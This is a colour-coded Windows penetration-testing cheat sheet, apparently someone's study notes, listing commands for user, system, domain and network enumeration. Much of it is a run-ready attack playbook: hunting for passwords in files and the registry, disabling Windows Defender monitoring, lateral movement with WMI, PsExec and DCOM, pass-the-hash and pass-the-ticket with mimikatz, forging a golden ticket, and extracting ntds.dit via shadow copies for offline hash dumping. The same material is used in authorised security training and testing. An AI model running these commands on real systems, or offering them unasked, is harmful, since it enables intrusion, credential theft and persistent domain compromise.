\033[0;34m##################################################################\033[0m
\033[1;35m=== User enumeration (Windows) ===\033[0m
\033[0;31m- Privileges of current user -\033[0m
whoami /priv

\033[0;31m- Groups of current user/system (CMD/Powershell) -\033[0m
whoami /groups
Get-LocalGroup

\033[0;31m- User,group,and privileges of current user -\033[0m
whoami /all

\033[0;31m- Users on machine (CMD/Powershell) -\033[0m
net users
Get-LocalUser

\033[0;31m- Info about specific user -\033[0m
net user <user>

\033[0;31m- Echo user -\033[0m
whoami

\033[0;31m- Echo hostname -\033[0m
hostname

\033[0;31m- Groupmembers, alias, and group comment (CMD/Powershell) -\033[0m 
net localgroup "<GROUPNAME>"
Get-LocalGroupMember "<group>"

\033[0;31m- List user history (Powershell) -\033[0m
Get-History

\033[0;31m- List user history from PSReadline (Powershell) -\033[0m
(Get-PSReadlineOption).HistorySavePath
\033[0;37mC:\\Users\\<..user..>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\033[0m
type C:\\Users\<..user..>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

\033[0;34m##################################################################\033[0m
\033[1;35m=== System enumeration (Windows) ===\033[0m
\033[0;31m- information about the system -\033[0m
systeminfo

\033[0;31m- get os version -\033[0m
ver

\033[0;31m- List hotfixes -\033[0m
wmic qfe get Caption,Description,HotFixID,Installation

\033[0;31m- List drives -\033[0m
wmic logicaldisk get Caption,Description,ProviderName

\033[0;31m- Search for installed programs (Powershell) -\033[0m
Get-ChildItem -Path "C:\Program Files (x86)" -Recurse

Get-ChildItem -Path "C:\Program Files" -Recurse

\033[0;31m- Locate specific file -\033[0m
where <filename>

\033[0;31m- Search for specific fileextensions (Powershell) -\033[0m
Get-ChildItem -Path <C:\\path\\to\\search> -Include <*.kdbx>, <*.txt>,... -File -Recurse -ErrorAction SilentlyContinue

\033[0;31m- List installed 32-bit applications via reg (remove 'select' for full details) (Powershell) -\033[0m
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\\Uninstall\*" | select displayname

\033[0;31m- List installed 64-bit applications via reg (remove 'select' for full details) (Powershell) -\033[0m
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\\Uninstall\*" | select displayname

\033[0;31m- List running processes (Powershell) -\033[0m 
Get-Process

\033[0;31m- List running services (Powershell) -\033[0m
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

\033[0;31m- Query all services running on the machine (CMD) -\033[0m
sc queryex type= service

\033[0;31m- Output permissionsmask of an executable (CMD/Powershell) -\033[0m
icacls "C:\\path\\to\\executable.exe"

\033[0;31m- Find path of process/binary (CMD/Powershell) -\033[0m
wmic process where name="<processname.exe>" get ExecutablePath

Get-Process <processname> | Select-Object -ExpandProperty Path

\033[0;31m- Search for blocked WinEvent, filter by ID in eventviewer (requires GUI) (Powershell) -\033[0m
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | findstr "Script Block"

\033[0;31m- List information about scheduled tasks (prints out a lot of information) (CMD/Powershell) -\033[0m
schtasks /query /fo LIST /v

\033[0;31m- If you know the TaskName you can filter for specific output (CMD/Powershell) -\033[0m
schtasks /query /TN "\\path\\task\\name" /fo LIST /v

\033[0;31m- List scheduled tasks within C:\\Users\\* (Powershell) -\033[0m
Get-ScheduledTask | Where-Object { $_Actions.Execute -like "<C:\\Users\\*>" }

\033[0;31m- List information about specific scheduled task (Powershell) -\033[0m
Get-ScheduledTask | Where-Object { $_.TaskName -like "<scheduled_task>" } | Format-List

\033[0;34m##################################################################\033[0m
\033[1;35m=== Domain enumeration (Windows) ===\033[0m
\033[0;31m- Get hosts in current domain -\033[0m
net view /domain

\033[0;31m- Get hosts in specific domain -\033[0m
net view /domain:<DOMAIN>

\033[0;31m- Get users in current domain -\033[0m
net user /domain

\033[0;31m- Get info about user in domain -\033[0m
net user <username> /domain

\033[0;31m- Get domaingroups -\033[0m
net group /domain

\033[0;31m- Get info/members of specific domaingroup -\033[0m
net group "<groupname>" /domain

\033[0;31m- Get domain password policy -\033[0m
net accounts /domain

\033[0;31m- get current SMB shares -\033[0m
net share

\033[0;31m- get active SMB sessions -\033[0m
net session | find /"\\"

\033[1;35m== Domain enumeration with PowerShell(Windows) ==\033[0m
\033[0;31m- Invoke Domain Class and the GetCurrentDomain method -\033[0m
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

\033[0;34m##################################################################\033[0m
\033[1;35m=== Password hunting (Windows) ===\033[0m
\033[0;31m- Find passwords with filtering & wildstar -\033[0m
findstr /si password *.txt | *.ini | *.config | <*...>

\033[0;31m- Search for password in registry -\033[0m
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

\033[0;34m##################################################################\033[0m
\033[1;35m=== Query windows registry keys (Windows) ===\033[0m
\033[0;31m- Example software (TightVNC) -\033[0m
reg query HKCU\SOFTWARE\ORL\WINVC3
\033[0;37m...encoded password...\033[0;31m(can be cracked with vncpasswd.py)\033[0m

\033[0;31m- Search for password in registry -\033[0m
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

\033[0;31m- Query Windows autologin -\033[0m
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\winlogon"

\033[0;31m- Query SNMP Parameters -\033[0m
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

\033[0;31m- Query Putty -\033[0m
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

\033[0;34m##################################################################\033[0m
\033[1;35m=== Windows Defender (Windows) ===\033[0m
\033[0;31m- Turn off windows defender -\033[0m
Set-MpPreference -DisableRealtimeMonitoring $true

\033[0;31m- Query windows defender-\033[0m
sc query windefend

\033[0;34m##################################################################\033[0m
\033[1;35m=== Windows Firewall (Windows) ===\033[0m
\033[0;31m- Show state of firewall -\033[0m
netsh firewall show state

\033[0;31m- Dump firewall rules -\033[0m
netsh advfirewall firewall dump

\033[0;34m##################################################################\033[0m
\033[1;35m=== Windows Remoting (Windows) ===\033[0m
\033[0;31m- Turn on PSRemoting -\033[0m
Enable-PSRemoting -Force -SkipNetworkProfileCheck

\033[0;34m##################################################################\033[0m
\033[1;35m=== Network enumeration (Windows) ===\033[0m
\033[0;31m- Basic IP configurations -\033[0m
ipconfig

\033[0;31m- Detailed IP configurations -\033[0m
ipconfig /all

\033[0;31m- Arptable (all) -\033[0m
arp -a

\033[0;31m- Routing table -\033[0m
route print

\033[0;31m- Established connections & Listening ports -\033[0m
netstat -ano

\033[0;31m- (netsh) Add portproxy rule -\033[0m
netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_ip> connectport=<target_port> connectaddress=<target_ip>

\033[0;31m- (netsh) Delete portproxy rule -\033[0m
netsh interface portproxy del v4tov4 listenport=<local_port> listenaddress=<local_ip>

\033[0;31m- (netsh) Add firewall rules (requires administrative privileges) -\033[0m
netsh advfirewall firewall add rule name="<rule_name>" protocol=TCP dir=in localip=<local_ip> localport=<local_port> action=allow

\033[0;31m- (netsh) Delete a firewall rule (requires administrative privileges) -\033[0m
netsh advfirewall firewall delete rule name="<rule_name>"

\033[0;34m##################################################################\033[0m
\033[1;35m=== Automated Enumeration (Windows) ===\033[0m
\033[0;31m- Automate Enumeration With winPEASx64/winPEASx86 -\033[0m
.\winPEASx64.exe
.\winPEASx86.exe

\033[0;31m- Automate Enumeration With seatbelt -\033[0m
.\seatbelt.exe -group=all

\033[1;35m=== Collecting data with Sharphound & Bloodhound (Windows) ===\033[0m
\033[0;31m- Import the module -\033[0m
Import-Module .\Sharphound.ps1

\033[0;31m- Collect data & output to disk -\033[0m
Invoke-BloodHound -CollectionMethod All -OutputDirectory <C:\\\\Users\\stephanie\\Desktop\\> -OutPrefix "corp audit"

\033[0;31m- start neo4j for bloodhound -\033[0m
sudo neo4j start

\033[0;31m- start bloodhound -\033[0m
bloodhound

\033[0;34m##################################################################\033[0m
\033[1;35m=== Lateral Movement (Windows) ===\033[0m
\033[0;31m- WMI -\033[0m
wmic /node:<TARGET_IP> /user:<USER> /password:<PASS> process call create "<PROCESS, e.g: calc,cmd,notepad>"

\033[0;31m- PsExec -\033[0m
PsExec64.exe -i \\<HOSTNAME> -u <DOMAIN\\USERNAME> -p <PASSWORD> <PROCESS, e.g: cmd,calc,notepad>

\033[0;31m- Pass the Hash -\033[0m
/usr/bin/impacket-wmiexec -hashes :<NTLM> administrator@<TARGET_IP>

\033[0;31m- Overpass the Hash -\033[0m
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM> /run:<PROCESS, e.g: cmd>

 \033[1;35m(generate a TGT)\033[0m
net use \\\\<HOSTNAME>

 \033[1;35m(list newly requested kerberos tickets)\033[0m
klist

 \033[1;35m(run PsExec with Kerberos tickets)\033[0m
PsExec.exe \\\\<HOSTNAME> <PROCESS, e.g: cmd>

\033[0;31m- Pass the Ticket -\033[0m
sekurlsa::tickets /export

\033[1;35m(filter for kribi extension)\033[0m
dir *.kirbi

\033[1;35m(injecting selected TGS into process memory)\033[0m
kerberos::ptt [0;<0;12bd0>]<-0-0-40810000-name>@<cifs-web04.kirbi>

\033[0;31m- DCOM -\033[0m
\033[1;35m(remotely instantiating the MMC Application Object)\033[0m
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))

\033[1;35m(executing a command on the remote DCOM object)\033[0m
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"<THING_TO_EXEC>","7")

\033[1;35m=== Active Directory Persistence (Windows) ===\033[0m
\033[0;31m- forge a ticket (golden ticket) -\033[0m
\033[1;35m(delete existing tickets)\033[0m
kerberos::purge

\033[1;35m(forge golden ticket)\033[0m
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DC_SID> /krbtgt:<KRBTGT_NTLM> /ptt

\033[1;35m(launch cmd with new ticket)\033[0m
misc::cmd

\033[1;35m(if a ticket has been forged)\033[0m
PsExec.exe \\<DC_HOSTNAME> cmd

\033[0;31m- Shadow Copies -\033[0m
\033[1;35m(disable writers)\033[0m
vshadow.exe -nw -p C:

\033[1;35m(copy the drive root folder)\033[0m
<copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak>

\033[1;35m(save SYSTEM hive)\033[0m
reg.exe save hklm\\system c:\\system.bak

\033[1;35m(once the two .bak files are moved to the attacker machine)\033[0m
impacket-secretsdump -ntds <ntds.dit.bak> -system <system.bak> LOCAL

\033[0;34m##################################################################\033[0m
\n
